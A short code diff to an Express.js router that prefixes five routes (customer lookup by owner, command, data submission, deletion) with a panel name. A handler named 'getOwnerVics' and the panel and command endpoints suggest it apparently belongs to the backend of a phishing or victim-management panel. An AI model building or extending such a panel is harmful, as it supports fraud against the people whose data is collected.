@@ -9,10 +9,10 @@ const {
 
 const router = express.Router();
 
-router.get("/customers/:owner", getOwnerVics);
-router.post("/command", command);
-router.get("/customers/id/:uniqueid", getInfo);
-router.post("/data", submitData);
-router.post("/delete", deleteEntry);
+router.get("/:panelName/customers/:owner", getOwnerVics);
+router.post("/:panelName/command", command);
+router.get("/:panelName/customers/id/:uniqueid", getInfo);
+router.post("/:panelName/data", submitData);
+router.post("/:panelName/delete", deleteEntry);
 
 module.exports = router;
